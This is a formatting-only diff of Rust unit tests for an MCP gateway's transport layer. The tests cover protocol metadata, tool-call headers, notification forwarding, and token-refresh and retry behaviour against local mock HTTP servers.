+                .unwrap()
+                .last()
+                .unwrap()
+                .resource_subscriptions,
             vec!["fixture://a".to_string()]
         );
         assert!(
@@ -7627,16 +7956,21 @@ mod tests {
             }
         });
         merge_protocol_meta(&mut params, &protocol_meta_for(MODERN_PROTOCOL_VERSION));
-        assert_eq!(params["_meta"]["traceparent"], "keep", "client keys survive");
+        assert_eq!(
+            params["_meta"]["traceparent"], "keep",
+            "client keys survive"
+        );
         assert_eq!(params["_meta"][VERSION_KEY], MODERN_PROTOCOL_VERSION);
         assert_eq!(
             params["_meta"]["io.modelcontextprotocol/clientCapabilities"]["extensions"]
                 ["com.example/opaque"]["mode"],
             "strict"
         );
-        assert!(params["_meta"]["io.modelcontextprotocol/clientCapabilities"]
-            .get("sampling")
-            .is_none());
+        assert!(
+            params["_meta"]["io.modelcontextprotocol/clientCapabilities"]
+                .get("sampling")
+                .is_none()
+        );
 
         // A non-object `_meta` is rebuilt rather than panicking or being ignored.
         let mut params = json!({ "_meta": "nonsense" });
@@ -7685,7 +8019,9 @@ mod tests {
         let calls = Arc::new(Mutex::new(Vec::new()));
         let mut server = DownstreamServer::connect(
             "modern".to_string(),
-            Box::new(ExtensionProbe { calls: Arc::clone(&calls) }),
+            Box::new(ExtensionProbe {
+                calls: Arc::clone(&calls),
+            }),
         )
         .unwrap();
         assert_eq!(server.extensions()["com.example/opaque"]["mode"], "strict");
@@ -7739,19 +8075,18 @@ mod tests {
                 );
             }
             let mut request_body = String::new();
-            request.as_reader().read_to_string(&mut request_body).unwrap();
+            request
+                .as_reader()
+                .read_to_string(&mut request_body)
+                .unwrap();
             let request_body: Value = serde_json::from_str(&request_body).unwrap();
             assert_eq!(request_body["params"]["name"], "downstream_tool");
-            let content_type = tiny_http::Header::from_bytes(
-                &b"Content-Type"[..],
-                &b"application/json"[..],
-            )
-            .unwrap();
-            let legacy_session = tiny_http::Header::from_bytes(
-                &b"Mcp-Session-Id"[..],
-                &b"must-be-ignored"[..],
-            )
-            .unwrap();
+            let content_type =
+                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
+                    .unwrap();
+            let legacy_session =
+                tiny_http::Header::from_bytes(&b"Mcp-Session-Id"[..], &b"must-be-ignored"[..])
+                    .unwrap();
             request
                 .respond(
                     tiny_http::Response::from_string(
@@ -7777,11 +8112,23 @@ mod tests {
         handle.join().unwrap();
 
         let headers = captured.lock().unwrap();
-        assert_eq!(headers.get("mcp-method").map(String::as_str), Some("tools/call"));
-        assert_eq!(headers.get("mcp-name").map(String::as_str), Some("downstream_tool"));
-        assert_eq!(headers.get("mcp-param-region").map(String::as_str), Some("west"));
+        assert_eq!(
+            headers.get("mcp-method").map(String::as_str),
+            Some("tools/call")
+        );
+        assert_eq!(
+            headers.get("mcp-name").map(String::as_str),
+            Some("downstream_tool")
+        );
+        assert_eq!(
+            headers.get("mcp-param-region").map(String::as_str),
+            Some("west")
+        );
         assert!(!headers.contains_key("mcp-session-id"));
-        assert!(transport.session_id.is_none(), "modern responses cannot restore a legacy session");
+        assert!(
+            transport.session_id.is_none(),
+            "modern responses cannot restore a legacy session"
+        );
     }
 
     #[test]
@@ -7812,11 +8159,9 @@ mod tests {
         let port = server.server_addr().to_ip().unwrap().port();
         let handle = std::thread::spawn(move || {
             let request = server.recv().unwrap();
-            let content_type = tiny_http::Header::from_bytes(
-                &b"Content-Type"[..],
-                &b"application/json"[..],
-            )
-            .unwrap();
+            let content_type =
+                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
+                    .unwrap();
             request
                 .respond(
                     tiny_http::Response::from_string(
@@ -7873,10 +8218,7 @@ mod tests {
                 "$defs": { "route": { "type": "string", "x-mcp-header": "Route" } }
             }
         });
-        let tools = filter_modern_http_tools(
-            "fixture",
-            vec![valid.clone(), duplicate, hidden],
-        );
+        let tools = filter_modern_http_tools("fixture", vec![valid.clone(), duplicate, hidden]);
         assert_eq!(tools, vec![valid]);
 
         let headers = tool_request_headers(
@@ -7892,7 +8234,10 @@ mod tests {
             vec![
                 ("Mcp-Param-Dry-Run".to_string(), "true".to_string()),
                 ("Mcp-Param-Priority".to_string(), "7".to_string()),
-                ("Mcp-Param-Region".to_string(), "=?base64?IOaXpeacrCA=?=".to_string()),
+                (
+                    "Mcp-Param-Region".to_string(),
+                    "=?base64?IOaXpeacrCA=?=".to_string()
+                ),
             ]
         );
     }
@@ -7944,7 +8289,9 @@ mod tests {
             events: Arc::clone(&events),
             responses: VecDeque::from(vec![
                 // initialize: refused, as a modern server must.
-                Err(TransportError::Rpc(json!({ "code": -32601, "message": "no initialize" }))),
+                Err(TransportError::Rpc(
+                    json!({ "code": -32601, "message": "no initialize" }),
+                )),
                 // First server/discover: "not that version, but I speak ours too".
                 Err(TransportError::Rpc(json!({
                     "code": super::UNSUPPORTED_PROTOCOL_VERSION,
@@ -7987,7 +8334,9 @@ mod tests {
         );
         let expected = format!("stamp:{MODERN_PROTOCOL_VERSION}");
         assert!(
-            events[discovers[0] + 1..discovers[1]].iter().any(|e| *e == expected),
+            events[discovers[0] + 1..discovers[1]]
+                .iter()
+                .any(|e| *e == expected),
             "the retry must re-stamp between the two sends, got {events:?}"
         );
     }
@@ -8089,13 +8438,27 @@ mod tests {
         let line = r#"{"jsonrpc":"2.0","method":"notifications/progress","params":{"progressToken":"tp-1","progress":1,"total":2}}"#;
 
         // Unarmed (still in the handshake window): forwarded, but not routed.
-        assert!(forward_line(line.to_string(), &tx, &dirty, &armed, &no_sink, &progress));
+        assert!(forward_line(
+            line.to_string(),
+            &tx,
+            &dirty,
+            &armed,
+            &no_sink,
+            &progress
+        ));
         assert!(seen.lock().unwrap().is_empty());
         assert_eq!(rx.recv().unwrap(), line);
 
         // Armed: the sink receives the whole notification, token included.
         armed.store(true, Ordering::SeqCst);
-        assert!(forward_line(line.to_string(), &tx, &dirty, &armed, &no_sink, &progress));
+        assert!(forward_line(
+            line.to_string(),
+            &tx,
+            &dirty,
+            &armed,
+            &no_sink,
+            &progress
+        ));
         let got = seen.lock().unwrap().clone();
         assert_eq!(got.len(), 1);
         assert_eq!(got[0]["params"]["progressToken"], "tp-1");
@@ -8105,8 +8468,16 @@ mod tests {
 
         // A progress notification with no token is unroutable and never reaches
         // the sink, so the gateway is not woken for something it must drop.
-        let untokened = r#"{"jsonrpc":"2.0","method":"notifications/progress","params":{"progress":1}}"#;
-        assert!(forward_line(untokened.to_string(), &tx, &dirty, &armed, &no_sink, &progress));
+        let untokened =
+            r#"{"jsonrpc":"2.0","method":"notifications/progress","params":{"progress":1}}"#;
+        assert!(forward_line(
+            untokened.to_string(),
+            &tx,
+            &dirty,
+            &armed,
+            &no_sink,
+            &progress
+        ));
         assert_eq!(seen.lock().unwrap().len(), 1, "still just the one");
     }
 
@@ -8129,14 +8500,31 @@ mod tests {
         let line = r#"{"jsonrpc":"2.0","method":"notifications/resources/updated","params":{"uri":"fixture://r"}}"#;
 
         // Unarmed: no sink call.
-        assert!(forward_line(line.to_string(), &tx, &dirty, &armed, &sink_opt, &no_progress));
+        assert!(forward_line(
+            line.to_string(),
+            &tx,
+            &dirty,
+            &armed,
+            &sink_opt,
+            &no_progress
+        ));
         assert!(seen.lock().unwrap().is_empty());
         assert_eq!(rx.recv().unwrap(), line);
 
         // Armed: sink receives the URI; dirty bits stay clear (not a list change).
         armed.store(true, Ordering::SeqCst);
-        assert!(forward_line(line.to_string(), &tx, &dirty, &armed, &sink_opt, &no_progress));
-        assert_eq!(seen.lock().unwrap().as_slice(), &["fixture://r".to_string()]);
+        assert!(forward_line(
+            line.to_string(),
+            &tx,
+            &dirty,
+            &armed,
+            &sink_opt,
+            &no_progress
+        ));
+        assert_eq!(
+            seen.lock().unwrap().as_slice(),
+            &["fixture://r".to_string()]
+        );
         assert_eq!(dirty.as_ref().unwrap().load(Ordering::SeqCst), 0);
         assert_eq!(rx.recv().unwrap(), line);
     }
@@ -8163,9 +8551,8 @@ mod tests {
                 .find(|h| h.field.equiv("Authorization"))
                 .map(|h| h.value.as_str().to_string())
                 .unwrap_or_default();
-            let ct =
-                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
-                    .unwrap();
+            let ct = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
+                .unwrap();
             let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
             let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
         });
@@ -8173,7 +8560,10 @@ mod tests {
         let refresh_calls = Arc::new(AtomicUsize::new(0));
         let calls = Arc::clone(&refresh_calls);
         let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
-            assert!(!force, "successful proactive refresh should avoid a forced retry");
+            assert!(
+                !force,
+                "successful proactive refresh should avoid a forced retry"
+            );
             calls.fetch_add(1, Ordering::SeqCst);
             Ok(Some("fresh".to_string()))
         }));
@@ -8211,9 +8601,8 @@ mod tests {
                 .find(|h| h.field.equiv("Authorization"))
                 .map(|h| h.value.as_str().to_string())
                 .unwrap_or_default();
-            let ct =
-                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
-                    .unwrap();
+            let ct = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
+                .unwrap();
             let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
             let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
         });
@@ -8339,7 +8728,10 @@ mod tests {
         assert_eq!(forced_refreshes.load(Ordering::SeqCst), 0);
         assert_eq!(
             seen_auth.lock().unwrap().as_slice(),
-            &["Bearer old-token".to_string(), "Bearer step-up-token".to_string()]
+            &[
+                "Bearer old-token".to_string(),
+                "Bearer step-up-token".to_string()
+            ]
         );
     }
 
@@ -8372,8 +8764,7 @@ mod tests {
                 };
                 let challenge = tiny_http::Header::from_bytes(
                     b"WWW-Authenticate",
-                    format!("Bearer error=\"insufficient_scope\", scope=\"{scope}\"")
-                        .as_bytes(),
+                    format!("Bearer error=\"insufficient_scope\", scope=\"{scope}\"").as_bytes(),
                 )
                 .unwrap();
                 request
@@ -8506,9 +8897,8 @@ mod tests {
                         .find(|h| h.field.equiv("Authorization"))
                         .map(|h| h.value.as_str().to_string())
                         .unwrap_or_default();
-                    let _ = req.respond(
-                        tiny_http::Response::from_string("{}").with_status_code(202),
-                    );
+                    let _ =
+                        req.respond(tiny_http::Response::from_string("{}").with_status_code(202));
                 }
             }
         });
@@ -8568,9 +8958,11 @@ mod tests {
                     );
                 } else {
                     *ra.lock().unwrap() = auth;
-                    let ct =
-                        tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
-                            .unwrap();
+                    let ct = tiny_http::Header::from_bytes(
+                        &b"Content-Type"[..],
+                        &b"application/json"[..],
+                    )
+                    .unwrap();
                     let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                     let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                 }
@@ -8587,13 +8979,24 @@ mod tests {
         }));
         let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
         let res = t
-            .post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true)
+            .post(
+                &serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }),
+                true,
+            )
             .expect("post should succeed after the token refresh");
         handle.join().unwrap();
 
         assert!(res.is_some(), "got the 200 result after refreshing");
-        assert_eq!(hits.load(Ordering::SeqCst), 2, "exactly one 401 then one retry");
-        assert_eq!(*retry_auth.lock().unwrap(), "Bearer fresh", "retry used the new token");
+        assert_eq!(
+            hits.load(Ordering::SeqCst),
+            2,
+            "exactly one 401 then one retry"
+        );
+        assert_eq!(
+            *retry_auth.lock().unwrap(),
+            "Bearer fresh",
+            "retry used the new token"
+        );
     }
 
     #[test]
@@ -8648,7 +9051,10 @@ mod tests {
         let url = format!("http://127.0.0.1:{port}/");
         let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
         let body = serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "initialize" });
-        assert!(t.post(&body, true).is_err(), "an always-401 server cannot succeed");
+        assert!(
+            t.post(&body, true).is_err(),
+            "an always-401 server cannot succeed"
+        );
         // The second POST is the era probe, on the same transport and the same
         // (already once-refreshed) token.
         assert!(t.post(&body, true).is_err(), "still 401");
@@ -8663,7 +9069,11 @@ mod tests {
         );
         // 401, refresh, 401(retry) on the first post; the second post sends once
         // and gives up without minting anything.
-        assert_eq!(posts.load(Ordering::SeqCst), 3, "no retry on the second POST");
+        assert_eq!(
+            posts.load(Ordering::SeqCst),
+            3,
+            "no retry on the second POST"
+        );
     }
 
     #[test]
@@ -8712,8 +9122,8 @@ mod tests {
                     let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                     let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                 } else {
-                    let _ = req
-                        .respond(tiny_http::Response::from_string("nope").with_status_code(401));
+                    let _ =
+                        req.respond(tiny_http::Response::from_string("nope").with_status_code(401));
                 }
             }
         });
@@ -8736,7 +9146,10 @@ mod tests {
         let body = serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" });
 
         // First expiry: 401, forced refresh to minted-0, retry accepted.
-        assert!(t.post(&body, true).is_ok(), "first reactive refresh recovers");
+        assert!(
+            t.post(&body, true).is_ok(),
+            "first reactive refresh recovers"
+        );
         // The accepted token is now stale at the provider (it is not minted-1),
         // so this 401s. The budget must be available again to recover.
         assert!(
@@ -8786,8 +9199,8 @@ mod tests {
                     let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                     let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                 } else {
-                    let _ = req
-                        .respond(tiny_http::Response::from_string("nope").with_status_code(401));
+                    let _ =
+                        req.respond(tiny_http::Response::from_string("nope").with_status_code(401));
                 }
             }
         });
@@ -8811,7 +9224,10 @@ mod tests {
         let url = format!("http://127.0.0.1:{port}/");
         let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
         let body = serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" });
-        assert!(t.post(&body, true).is_err(), "first POST exhausts its budget");
+        assert!(
+            t.post(&body, true).is_err(),
+            "first POST exhausts its budget"
+        );
         assert!(
             t.post(&body, true).is_ok(),
             "a proactively-refreshed token gets its own forced-refresh budget"
@@ -8830,8 +9246,8 @@ mod tests {
     #[test]
     fn post_returns_retry_on_429_with_retry_after() {
         use super::{HttpTransport, TransportError};
-        use std::sync::Arc;
         use std::sync::atomic::{AtomicUsize, Ordering};
+        use std::sync::Arc;
         use std::time::Duration;
 
         // Mock MCP server: 429 with Retry-After: 2 on the first request,
@@ -8854,7 +9270,11 @@ mod tests {
                             .with_header(ra),
                     );
                 } else {
-                    let ct = tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..]).unwrap();
+                    let ct = tiny_http::Header::from_bytes(
+                        &b"Content-Type"[..],
+                        &b"application/json"[..],
+                    )
+                    .unwrap();
                     let body = r#"{"jsonrpc":"2.0","id":1,"result":{"ok":true}}"#;
                     let _ = req.respond(tiny_http::Response::from_string(body).with_header(ct));
                 }
@@ -8865,7 +9285,10 @@ mod tests {
         let mut t = HttpTransport::new(&url);
 
         // First call: should get a Retry signal, NOT an Ok or Fatal.
-        let result = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true);
+        let result = t.post(
+            &serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }),
+            true,
+        );
         match &result {
             Err(TransportError::Retry { retry_after, .. }) => {
                 assert_eq!(*retry_after, Some(Duration::from_secs(2)));
@@ -8874,7 +9297,10 @@ mod tests {
         }
 
         // Second call: the server now responds 200.
-        let result2 = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 2, "method": "ping" }), true);
+        let result2 = t.post(
+            &serde_json::json!({ "jsonrpc": "2.0", "id": 2, "method": "ping" }),
+            true,
+        );
         assert!(result2.is_ok(), "second call should succeed: {result2:?}");
         assert_eq!(hits.load(Ordering::SeqCst), 2);
 
@@ -8888,7 +9314,10 @@ mod tests {
         // The bug case: whole invocation packed into `command`, empty args.
         assert_eq!(
             normalize_invocation("npx -y @modelcontextprotocol/server-github", &[]),
-            ("npx".into(), s(&["-y", "@modelcontextprotocol/server-github"])),
+            (
+                "npx".into(),
+                s(&["-y", "@modelcontextprotocol/server-github"])
+            ),
         );
         // Args with slashes (a package path or a filesystem root) survive the split.
         assert_eq!(
@@ -8915,7 +9344,10 @@ mod tests {
 
         // A dead port: connection refused, which is a retryable transport error.
         let mut t = HttpTransport::new("http://127.0.0.1:1/");
-        let result = t.post(&serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }), true);
+        let result = t.post(
+            &serde_json::json!({ "jsonrpc": "2.0", "id": 1, "method": "ping" }),
+            true,
+        );
         match &result {
             Err(TransportError::Retry { retry_after, .. }) => {
                 assert!(retry_after.is_none());
